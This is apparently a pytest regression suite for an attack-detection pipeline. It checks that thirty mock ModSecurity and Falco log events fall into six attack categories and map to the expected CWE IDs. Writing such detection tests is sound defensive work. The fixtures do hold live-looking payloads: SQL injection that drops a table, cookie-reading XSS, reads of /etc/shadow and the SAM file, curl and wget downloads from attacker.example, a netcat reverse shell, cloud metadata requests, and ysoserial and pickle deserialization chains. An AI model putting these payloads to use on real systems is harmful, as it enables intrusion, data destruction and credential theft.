"""Phase 1 Week 11 — 6-category detection regression suite.

Verifies that every detection path (3 ModSecurity-driven web attacks +
3 Falco-driven system attacks) produces the correct CWE on the
fixture corpus. Per the spec we run **five distinct mock payloads per
category** and assert 30/30 are categorised correctly end-to-end:

    NormalizedEvent.attack_category → cwe_mapping.map_to_cwe → CWE-XX

If any payload misses, we fail with the specific category + sample
index so the gap is obvious in CI.

Categories:
    Web (ModSecurity CRS):
      - SQL Injection           → CWE-89
      - Cross-Site Scripting    → CWE-79
      - Path Traversal          → CWE-22
    System (Falco syscall):
      - Command Injection       → CWE-78
      - SSRF                    → CWE-918
      - Insecure Deserialization → CWE-502
"""

from __future__ import annotations

from typing import Iterable

import pytest

from src.adapters.falco import FalcoAdapter
from src.adapters.modsecurity import ModSecurityAdapter
from src.cwe_mapping import map_to_cwe
from src.normalizer import EventNormalizer


# ── ModSecurity fixtures: 5 per category, real-looking CRS log shape ──────

def _modsec_log(rule_id: str, severity: str, method: str, uri: str,
                body: str = "", qs: str = "") -> dict:
    return {
        "transaction": {
            "time": "2026-05-26T12:00:00Z",
            "remote_address": "203.0.113.42",
            "request": {
                "method": method,
                "uri": uri,
                "body": body,
                "query_string": qs,
            },
        },
        "audit_data": {
            "messages": [{"details": {"ruleId": rule_id, "severity": severity}}],
        },
    }


SQLI_SAMPLES = [
    _modsec_log("942100", "CRITICAL", "POST", "/api/login",
                body="username=admin'%20OR%20'1'='1&password=x"),
    _modsec_log("942130", "CRITICAL", "POST", "/api/login",
                body="username=' OR 1=1--&password=x"),
    _modsec_log("942190", "CRITICAL", "GET", "/api/search",
                qs="q=UNION+SELECT+null,version()--"),
    _modsec_log("942260", "CRITICAL", "GET", "/api/items",
                qs="id=1;DROP TABLE users"),
    _modsec_log("942500", "WARNING", "GET", "/api/users",
                qs="id=1 OR sleep(5)"),
]

XSS_SAMPLES = [
    _modsec_log("941100", "WARNING", "GET", "/api/search",
                qs="q=<script>alert(1)</script>"),
    _modsec_log("941110", "WARNING", "POST", "/api/comments",
                body="msg=<img src=x onerror=alert(1)>"),
    _modsec_log("941160", "WARNING", "GET", "/api/page",
                qs="name=<svg/onload=alert(1)>"),
    _modsec_log("941180", "CRITICAL", "POST", "/api/profile",
                body="bio=<iframe srcdoc='<script>fetch(/...)</script>'>"),
    _modsec_log("941200", "WARNING", "GET", "/api/echo",
                qs="x=javascript:alert(document.cookie)"),
]

PATH_TRAVERSAL_SAMPLES = [
    _modsec_log("930100", "CRITICAL", "GET", "/api/file",
                qs="name=../../etc/passwd"),
    _modsec_log("930110", "CRITICAL", "GET", "/api/file",
                qs="name=..%2f..%2fetc%2fpasswd"),
    _modsec_log("930120", "CRITICAL", "GET", "/api/static",
                qs="path=..\\..\\windows\\system32\\config\\sam"),
    _modsec_log("930130", "CRITICAL", "GET", "/api/download",
                qs="file=/etc/shadow"),
    _modsec_log("930150", "CRITICAL", "POST", "/api/upload",
                body="filename=../../../var/log/auth.log"),
]


# ── Falco fixtures: 5 per category. Tag in `tags` drives the category. ────

def _falco_event(rule: str, tag: str, priority: str, output: str,
                 sip: str | None = None, cmdline: str | None = None) -> dict:
    fields: dict = {
        "k8s.ns.name": "elden-production",
        "k8s.pod.name": "target-app-001",
    }
    if sip:
        fields["fd.sip"] = sip
    if cmdline:
        fields["proc.cmdline"] = cmdline
    return {
        "rule": rule,
        "priority": priority,
        "time": "2026-05-26T12:00:00.000000000Z",
        "output": output,
        "output_fields": fields,
        "tags": [tag],
    }


COMMAND_INJECTION_SAMPLES = [
    _falco_event("ELDEN Command Injection via Web Process", "command-injection",
                 "Critical", "shell spawned by web process",
                 cmdline="sh -c id"),
    _falco_event("ELDEN Command Injection via Web Process", "command-injection",
                 "Critical", "shell spawned by web process",
                 cmdline="bash -c 'cat /etc/passwd'"),
    _falco_event("ELDEN Command Injection via Web Process", "command-injection",
                 "Critical", "fetch tool spawned by web process",
                 cmdline="curl http://attacker.example/x.sh"),
    _falco_event("ELDEN Command Injection via Web Process", "command-injection",
                 "Critical", "fetch tool spawned by web process",
                 cmdline="wget http://attacker.example/x.sh -O /tmp/x.sh"),
    _falco_event("ELDEN Command Injection via Web Process", "command-injection",
                 "Critical", "netcat reverse shell pattern",
                 cmdline="nc -e /bin/sh 10.0.0.99 4444"),
]

SSRF_SAMPLES = [
    _falco_event("ELDEN SSRF Cloud Metadata Access", "ssrf", "Critical",
                 "connect to IMDS", sip="169.254.169.254",
                 cmdline="curl http://169.254.169.254/latest/meta-data/"),
    _falco_event("ELDEN SSRF Cloud Metadata Access", "ssrf", "Critical",
                 "IMDS token request", sip="169.254.169.254",
                 cmdline="curl -X PUT http://169.254.169.254/latest/api/token"),
    _falco_event("ELDEN SSRF Cloud Metadata Access", "ssrf", "Critical",
                 "wget to IMDS", sip="169.254.169.254",
                 cmdline="wget http://169.254.169.254/computeMetadata/v1/"),
    _falco_event("ELDEN SSRF Cloud Metadata Access", "ssrf", "Critical",
                 "python urllib to IMDS", sip="169.254.169.254",
                 cmdline="python -c 'import urllib; urllib.urlopen(...)'"),
    _falco_event("ELDEN SSRF Cloud Metadata Access", "ssrf", "Critical",
                 "raw connect to IMDS", sip="169.254.169.254",
                 cmdline="nc 169.254.169.254 80"),
]

INSECURE_DESERIALIZATION_SAMPLES = [
    _falco_event("ELDEN Insecure Deserialization Post-Exploit",
                 "insecure-deserialization", "Critical",
                 "ysoserial chain", cmdline="java -jar ysoserial.jar CommonsCollections1 calc"),
    _falco_event("ELDEN Insecure Deserialization Post-Exploit",
                 "insecure-deserialization", "Critical",
                 "Runtime.exec from Java", cmdline="java -cp app.jar Runtime.exec(sh)"),
    _falco_event("ELDEN Insecure Deserialization Post-Exploit",
                 "insecure-deserialization", "Critical",
                 "pickle gadget chain", cmdline="python -c 'pickle.loads(payload)'"),
    _falco_event("ELDEN Insecure Deserialization Post-Exploit",
                 "insecure-deserialization", "Critical",
                 "PyYAML unsafe load", cmdline="python -c 'yaml.load(open(/tmp/x))'"),
    _falco_event("ELDEN Insecure Deserialization Post-Exploit",
                 "insecure-deserialization", "Critical",
                 "Java commons-collections chain",
                 cmdline="java -cp commons-collections-3.2.1.jar Gadget"),
]


# ── Detection corpus: 6 categories × 5 samples = 30 events ────────────────

DETECTION_CORPUS: list[tuple[str, str, list[dict], str]] = [
    ("SQL Injection",              "modsecurity", SQLI_SAMPLES,                    "CWE-89"),
    ("Cross-Site Scripting",       "modsecurity", XSS_SAMPLES,                     "CWE-79"),
    ("Path Traversal",             "modsecurity", PATH_TRAVERSAL_SAMPLES,          "CWE-22"),
    ("Command Injection",          "falco",       COMMAND_INJECTION_SAMPLES,       "CWE-78"),
    ("Server-Side Request Forgery","falco",       SSRF_SAMPLES,                    "CWE-918"),
    ("Insecure Deserialization",   "falco",       INSECURE_DESERIALIZATION_SAMPLES,"CWE-502"),
]


def _all_cases() -> Iterable[tuple[str, str, dict, int, str]]:
    """Flatten the corpus into ``(category, source, sample, idx, cwe_id)`` rows."""
    for category, source, samples, cwe_id in DETECTION_CORPUS:
        for idx, sample in enumerate(samples, start=1):
            yield category, source, sample, idx, cwe_id


class TestSixCategoryDetectionMatrix:
    """30/30 mock attacks must be categorised + mapped to the expected CWE."""

    def setup_method(self):
        self.normalizer = EventNormalizer()

    @pytest.mark.parametrize(
        "category,source,sample,idx,expected_cwe",
        list(_all_cases()),
        ids=[
            f"{cat.replace(' ', '_')}-{idx}"
            for cat, _, samples, _ in DETECTION_CORPUS
            for idx in range(1, len(samples) + 1)
        ],
    )
    def test_detection(self, category, source, sample, idx, expected_cwe):
        event = self.normalizer.normalize(sample)
        assert event.source == source, (
            f"[{category} #{idx}] expected source={source}, got {event.source}"
        )
        assert event.attack_category == category, (
            f"[{category} #{idx}] miscategorised as {event.attack_category!r}"
        )
        cwe = map_to_cwe(event.attack_category)
        assert cwe["cwe_id"] == expected_cwe, (
            f"[{category} #{idx}] mapped to {cwe['cwe_id']!r}, want {expected_cwe!r}"
        )

    def test_corpus_size_is_thirty(self):
        """Spec: 6 categories × 5 mock attacks = 30. Fail loud on drift."""
        total = sum(len(samples) for _, _, samples, _ in DETECTION_CORPUS)
        assert total == 30, f"Detection corpus must hold 30 cases, has {total}"

    def test_full_corpus_detection_rate(self):
        """Report 30/30 detection rate as a single aggregate assertion."""
        hits, misses = 0, []
        for category, source, sample, idx, expected_cwe in _all_cases():
            try:
                event = self.normalizer.normalize(sample)
                cwe = map_to_cwe(event.attack_category)
            except Exception as exc:
                misses.append(f"{category} #{idx}: exception {exc!r}")
                continue
            if (event.attack_category == category
                    and event.source == source
                    and cwe["cwe_id"] == expected_cwe):
                hits += 1
            else:
                misses.append(
                    f"{category} #{idx}: got source={event.source!r} "
                    f"category={event.attack_category!r} cwe={cwe['cwe_id']!r}"
                )
        assert hits == 30 and not misses, (
            f"Detection rate {hits}/30 — misses: {misses}"
        )
